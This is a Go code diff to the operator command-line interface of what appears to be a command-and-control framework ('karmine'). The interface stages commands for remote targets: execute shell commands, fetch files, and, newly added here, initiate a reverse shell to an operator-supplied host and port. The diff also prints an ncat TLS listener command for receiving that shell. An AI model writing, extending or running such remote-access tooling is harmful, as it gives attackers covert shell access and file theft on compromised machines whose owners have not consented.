@@ -33,10 +33,13 @@ var (
 	cmd       = app.Command("cmd", "stage a command")
 	exec      = cmd.Command("exec", "execute a shell command on target")
 	get       = cmd.Command("get", "get file(s) from a remote system")
+	revshell  = cmd.Command("revshell", "initiate reverse shell with one remote system")
 	viewCmd   = cmd.Command("view", "view current command stage")
 	deleteC   = cmd.Command("clear", "remove a command from the stage")
 	cmdstring = exec.Arg("command", "command to execute").Required().String()
 	files     = get.Arg("files", "array of files to fetch remotely, comma-separated").Required().String()
+	lhost     = revshell.Arg("lhost", "host that client connects to").Required().String()
+	lport     = revshell.Arg("lport", "port that client will connect to and server listens on").Required().String()
 	forwho    = app.Flag("for", "name of target to receive command").String()
 )
 
@@ -47,6 +50,7 @@ func main() {
 	}
 	cmdMap["exec"] = 1
 	cmdMap["get"] = 3
+	cmdMap["revshell"] = 4
 	switch kingpin.MustParse(app.Parse(os.Args[1:])) {
 	case viewFile.FullCommand():
 		content, err := datastore.ShowStage(filestage)
@@ -61,6 +65,11 @@ func main() {
 		handleCmd(db, "exec")
 	case get.FullCommand():
 		handleCmd(db, "get")
+	case revshell.FullCommand():
+		if len(*forwho) == 0 {
+			log.Fatal("'for' flag is required to initiate a reverse shell")
+		}
+		handleCmd(db, "revshell")
 	case viewCmd.FullCommand():
 		content, err := datastore.ShowStage(cmdstage)
 		if err != nil {
@@ -158,13 +167,23 @@ func handleCmd(db *datastore.Kdb, myCmd string) {
 	cmdlet := cmdMap[myCmd]
 	cmdObj := &models.KarObjectCmd{}
 	cmdObj.Cmd = cmdlet
-	if len(*cmdstring) != 0 {
+	switch myCmd {
+	case "exec":
 		cmdObj.Args = append(cmdObj.Args, models.MultiType{StrValue: *cmdstring})
-	}
-	if len(*files) != 0 {
-		for _, f := range strings.Split(*files, ",") {
-			cmdObj.Args = append(cmdObj.Args, models.MultiType{StrValue: f})
+	case "get":
+		if len(*files) != 0 {
+			for _, f := range strings.Split(*files, ",") {
+				cmdObj.Args = append(cmdObj.Args, models.MultiType{StrValue: f})
+			}
 		}
+	case "revshell":
+		if len(*lhost) != 0 && len(*lport) != 0 {
+			cmdObj.Args = append(cmdObj.Args, models.MultiType{StrValue: *lhost})
+			cmdObj.Args = append(cmdObj.Args, models.MultiType{StrValue: *lport})
+		}
+		fmt.Println("start a TLS listener with ncat. example:")
+		fmt.Printf("ncat -lnvp %s --ssl-cert $HOME/.kdots/karmine.crt --ssl-key $HOME/.kdots/karmine.key\n", *lport)
+
 	}
 	bytes, err := json.Marshal(cmdObj)
 	if err != nil {
